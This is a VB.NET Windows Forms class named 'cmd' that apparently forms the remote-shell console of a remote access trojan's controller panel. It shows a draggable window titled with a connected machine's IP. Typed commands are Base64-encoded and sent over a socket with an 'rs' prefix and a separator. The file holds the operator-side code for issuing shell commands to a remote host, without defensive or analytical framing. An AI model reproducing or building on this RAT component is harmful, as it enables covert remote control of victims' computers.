Imports System.Text
Imports System.Globalization
Imports System.Resources
Public Class cmd
    Private A As String()
    Private idx As Integer
    Private it As Integer
    Public sock As Integer
    Dim Curr As Double = 0.0



    Private Sub cmd_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Me.AllowTransparency = True
        Me.TransparencyKey = Me.BackColor
        Timer1.Start()
    End Sub

    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        ''436
        If Curr < 435 Then
            Curr += 43.6
            Me.Size = New Size(Me.Width, Curr)
        Else
            Timer1.Stop()
            Reforge()
            Load_Send()
        End If
    End Sub
#Region "Drag"

    Dim posX As Integer
    Dim posY As Integer
    Dim drag As Boolean



    Private Sub Header_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseDown
        If e.Button = MouseButtons.Left Then
            drag = True
            posX = Cursor.Position.X - Me.Left
            posY = Cursor.Position.Y - Me.Top
        End If
    End Sub

    Private Sub Header_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseUp
        drag = False
    End Sub

    Private Sub Header_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseMove
        If drag Then
            Me.Top = Cursor.Position.Y - posY
            Me.Left = Cursor.Position.X - posX
        End If
        Me.Cursor = Cursors.Default
    End Sub


    Private Sub buttonClos_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles buttonClos.Click
        Me.Close()
    End Sub
 


#End Region
    Private Sub T2_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles T2.KeyDown
        Select Case e.KeyCode
            Case Keys.Enter
                Dim text As String = T2.Text
                If text.Equals("exit") Or text.Equals("Exit") Or text.Equals("EXIT") Then
                    Me.Close()
                End If
                T2.Text = ""
                e.SuppressKeyPress = True
                Main.S.Send(sock, "rs" & Main.Yy & ENB([text]))
                Exit Select
        End Select
    End Sub
    Public Shared Function ENB(ByRef s As String) As String
        Return Convert.ToBase64String(Encoding.UTF8.GetBytes(s))
    End Function

    Private Sub Load_Send()
        Me.Text = Main.S.IP(sock)
    End Sub
    Sub Reforge() '636 --> 300 --> 318
        Me.Location = New Point(Screen.PrimaryScreen.WorkingArea.Size.Width / 2 - Me.Width / 2, Screen.PrimaryScreen.WorkingArea.Size.Height / 2 - 218)

        Me.Refresh()
    End Sub
    Private Sub T1_TextChanged(sender As System.Object, e As System.EventArgs) Handles T1.KeyDown
        T2.Focus()
    End Sub
End Class